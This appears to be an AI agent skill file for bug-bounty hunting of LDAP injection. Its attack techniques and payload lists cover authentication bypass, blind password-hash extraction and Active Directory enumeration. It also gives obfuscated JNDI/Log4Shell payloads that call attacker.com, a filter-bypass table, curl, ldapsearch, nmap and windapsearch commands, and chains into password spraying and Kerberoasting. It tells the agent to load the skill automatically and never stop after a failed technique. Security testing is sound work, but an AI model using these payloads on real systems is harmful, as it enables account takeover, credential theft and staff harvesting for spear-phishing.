---
name: hunt-ldap
description: "Use this skill when the target uses LDAP/Active Directory authentication; when fingerprint shows ADFS, OpenLDAP, FreeIPA, 389-ds, Oracle DSEE; when login forms backend onto corporate directory; when endpoints contain /ldap, /search, /directory, /users; when error messages reference LDAP filters or DN syntax. Load automatically for enterprise apps with SSO, intranet portals, employee-search features, or Active Directory integration. Only invoke if real impact potential — auth bypass, credential extraction, or sensitive AD data exposure. Skip theoretical findings."
type: hunt
---

# Hunt: LDAP Injection

## Crown Jewel Targets
- **Auth bypass on LDAP login** — `*)(uid=*` returns admin account (Critical)
- **Blind extraction of password hashes** via wildcard truthy/falsy filters (Critical for AD)
- **AD user enumeration** at scale — extract entire directory char-by-char (High)
- **Attribute extraction** (memberOf, employeeID, sAMAccountName, manager, telephoneNumber) for spear-phishing (High)
- **Bind-as-anyone** via filter manipulation (Critical → ATO)
- **LDAP-backed authorization bypass** — `groups=admin` injected via filter

## Detection Signals
- Error messages: `javax.naming.NameNotFoundException`, `LDAPException`, `bad search filter`, `protocol error`, `Invalid DN syntax`, `Operations error`, `Sizelimit exceeded`
- Tech stack: Java enterprise (Spring Security LDAP, JNDI), .NET DirectoryServices, Python python-ldap, PHP ldap_bind
- Endpoints: `/ldap`, `/auth/ldap`, `/search`, `/directory`, `/employees`, `/users/search`, `/api/v1/directory`
- Header hints: ADFS responses, NTLM challenges, Kerberos negotiate
- Behavior: search returns different results for `*` vs explicit value (filter injection likely)

## Attack Techniques
1. **Auth bypass — closing filter** — username `*)(uid=*))(|(uid=*` collapses filter `(&(uid=$user)(pass=$pass))` so password check is skipped.
2. **Auth bypass — wildcard user** — username `*)(uid=admin*)(|(uid=*` matches admin, password not validated.
3. **AND/OR confusion** — username `admin)(&)` short-circuits the filter to always-true (`(&)` matches everything in some LDAP parsers).
4. **NULL byte truncation** — `admin\00` in older Java/PHP LDAP stacks truncates filter.
5. **Blind boolean extraction** — `*)(uid=a*` vs `*)(uid=b*` — different response/timing reveals first character.
6. **Wildcard-suffix extraction** — `admin)(userPassword=a*)`, then `ab*`, `abc*` until full hash extracted.
7. **Attribute filter injection** — `*)(memberOf=cn=admins,*` reveals admin group members.
8. **Sub-filter abuse** — `*))%00` to comment out rest of filter (some parsers).
9. **Char-by-char username enumeration** — search field accepts wildcard; `a*` returns 100 results, `aa*` returns 12, etc.
10. **LDAP injection in DN** — `cn=admin\,ou=hacked,dc=evil,dc=com` for DN-context injection.
11. **Time-based blind** — Some LDAP servers (Oracle DSEE) have slow wildcard match — `userPassword=*aaaa*` slows query.
12. **JNDI injection (Java-only)** — if target uses JNDI lookup, inject `ldap://attacker.com/exploit` for Log4Shell-class RCE.

## Payloads
**Auth bypass username/password injection:**
```
*)(uid=*))(|(uid=*
*)(uid=*
*)(|(uid=*
*))%00
*))(|(uid=*
admin)(&)
admin)(!(&(1=0
admin*
admin*)((|userPassword=*
*)(uid=admin)(|(uid=*
admin)(|(password=*))
*))(|(cn=*
```

**Password field:**
```
*
*)(&
*))%00
*)(uid=*))(|(uid=*
```

**Blind extraction (in username):**
```
admin)(userPassword=a*
admin)(userPassword=b*
...
admin)(userPassword=*a*
admin)(description=*ssh*
```

**Group/attribute enumeration:**
```
*)(memberOf=*
*)(memberOf=cn=Domain Admins,*
*)(objectClass=*
*)(sAMAccountType=805306368)
```

**Wildcard search field abuse:**
```
a*       → list all users starting with 'a'
*admin*  → find admin accounts
*$       → enumerate service accounts
*@*.com  → email format users
```

**JNDI injection (Java apps — Log4Shell family):**
```
${jndi:ldap://attacker.com/a}
${jndi:ldaps://attacker.com:443/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/x}
```

## Bypass Methods
| Filter | Bypass |
|--------|--------|
| Strips `(` `)` | URL-encode `%28` `%29`, double-encode |
| Strips `*` | Encode `%2a`, try unicode `*` |
| Whitelist alphanumeric | Try DN-context injection in path: `/users/admin,ou=evil` |
| Length-limited | Use minimal: `*)(|(uid=*` (10 chars) or just `*` |
| Null byte stripped | Skip NULL trick — try filter-closure instead |
| Generic input sanitizer | Inject via custom header / cookie reaching LDAP filter (X-Forwarded-User, Remote-User) |
| LDAPS / TLS | Same payloads — protocol doesn't matter |
| Anti-CSRF | Use authenticated context; LDAP injection often in authenticated search |

## Tools
```bash
# Manual auth-bypass curl
curl -X POST 'https://target.com/login' \
  -d 'username=*)(uid=*))(|(uid=*&password=anything'

# ldapsearch (anonymous bind check)
ldapsearch -x -H ldap://target.com -b "dc=target,dc=com" -s sub "(objectClass=*)"
ldapsearch -x -H ldap://target.com -D "" -w "" -b "" -s base "(objectClass=*)"

# nmap LDAP scripts
nmap -p389,636 --script "ldap-search,ldap-rootdse,ldap-novell-getpass" target.com

# windapsearch (AD enumeration)
windapsearch -d target.com --dc-ip 10.0.0.1 -U   # users
windapsearch -d target.com --dc-ip 10.0.0.1 -PU  # privileged users

# Burp Intruder with LDAPi wordlist (PayloadsAllTheThings/Injection/LDAP)

# JNDI injection scanner
nuclei -t cves/2021/CVE-2021-44228.yaml -u https://target.com
```

## Impact
- **Critical**: Auth bypass (admin login), JNDI RCE, full directory extraction, password hash dump
- **High**: AD user enumeration with attributes (PII, org chart for spear-phishing), bypass-as-arbitrary-user
- **Medium**: Limited blind extraction, anonymous bind disclosure of internal hostnames

## Chain Potential
- **+ JNDI / Log4Shell** = LDAP filter injection in Java app → RCE (Critical)
- **+ AD recon** = extracted user list feeds password spray on M365/Okta (chain to `m365-entra-attack`)
- **+ Privilege escalation** = LDAP injection reveals admin group, then ATO admin via separate path
- **+ SSO** = bypass-as-arbitrary-user in LDAP backing SAML/OIDC → full impersonation
- **+ Internal recon** = LDAP discloses internal DNS names, leading to SSRF target list
- **+ Kerberoasting** = service account names from LDAP → offline crack
- **+ NTLM relay** = AD user list combined with NTLM authentication weakness

## Fallback Chain
1. If `*)(uid=*` blocked, try filter-collapse variants `*))%00`, `admin)(&)`, encoded `%2a%29%28uid%3d%2a`.
2. If auth bypass fails, switch to blind extraction — wildcard-suffix on userPassword/description/comment fields, char by char.
3. If injection in body fails, test custom headers (Remote-User, X-Forwarded-User, Proxy-User) that may flow into LDAP filter unsanitized.
4. Pivot to JNDI injection for Java targets (Log4Shell, JNDI-Injection-Exploit), anonymous LDAP bind on port 389/636, or attribute-enumeration via wildcard searches. Never stop because one technique failed.

## Real-World Reports (from Community Writeups)

Limited public reports — LDAP injection is rarely disclosed; most paid items are CodeQL detection queries and infra/anon-bind findings.

| Title | Program | Bounty | Source |
|---|---|---|---|
| [Python] CWE-090: LDAP Injection (CodeQL) | GitHub Security Lab | $4,500 | H1 #1212273 |
| CodeQL query for finding LDAP Injection in Java | GitHub Security Lab | $3,000 | H1 #787113 |
| LDAP injection vulnerability in Java (CodeQL) | GitHub Security Lab | $2,500 | H1 #956295 |
| [Python] CWE-522: Insecure LDAP Authentication | GitHub Security Lab | $1,800 | H1 #1350076 |
| [Java] CWE-297: Insecure LDAP endpoint config | GitHub Security Lab | $1,800 | H1 #1133572 |
| [Python] CWE-287: LDAP Improper Authentication | GitHub Security Lab | $1,800 | H1 #1287575 |
| [Java] CWE-522: Insecure LDAP authentication | GitHub Security Lab | $1,800 | H1 #1095708 |
| [CVE-2021-29156] LDAP Injection in ForgeRock OpenAM Webfinger | DoD | $0 | H1 #1278050 |
| [CVE-2021-29156] LDAP Injection | DoD | $0 | H1 #1278891 |
| Possible LDAP username + password disclosed on GitHub | Acronis | $0 | H1 #1004412 |
| LDAP Server NULL Bind Information Disclosure | DoD | $0 | H1 #1937235 |
| LDAP anonymous access at certrep.pki.state.gov:389 | US Dept of State | $0 | H1 #1869184 |
| Protocol Smuggling over LDAP password field | ownCloud | $0 | H1 #1054282 |
| DoS via LDAP Injection (cloudron-surfer) | Node 3rd-party | $0 | H1 #906959 |
| user_ldap app logs user passwords (debug) | Nextcloud | $0 | H1 #2101165 |

**PROVEN techniques** (3+ reports):
- **CVE-2021-29156 — ForgeRock OpenAM Webfinger LDAP injection** (DoD #1278050, #1278891) — `resource=acct:user*)(objectclass=*` style payload via webfinger endpoint.
- **Anonymous LDAP bind / NULL bind enumeration** (DoD #1937235, State Dept #1869184) — internet-reachable :389 with `objectClass=*` allowed full directory dump.
- **Hardcoded LDAP creds in public repos** (Acronis #1004412, Sifchain credential leaks) — `ldap://user:pass@dc.corp` strings in pushed config.

## High-Value Chains (from Reports)

- **LDAP Injection (CVE-2021-29156) → user enumeration → password spray → AD foothold** — DoD ForgeRock OpenAM (H1 #1278050, #1278891): webfinger LDAP filter injection let attacker dump usernames and feed them straight into a spray.
- **Anonymous bind → full directory dump → spear-phish target list** — US Dept of State certrep (H1 #1869184), DoD (H1 #1937235): unauthenticated `ldapsearch` returned every employee email + group membership.
- **CRLF/protocol smuggling in LDAP password field → bypass auth** — ownCloud (H1 #1054282): newline injection in the password field corrupted the bind, achieving anonymous treatment.
- **Hardcoded LDAP creds in public GitHub → corp directory access** — Acronis (H1 #1004412): leaked service-account creds bound to corporate AD with read-everything privileges.
- **Log4Shell / JNDI injection → RCE via LDAP referral** — IBB Log4j ecosystem: attacker-controlled LDAP server returned `objectClass=javax.naming.Reference` with remote-class URL → arbitrary deserialization.
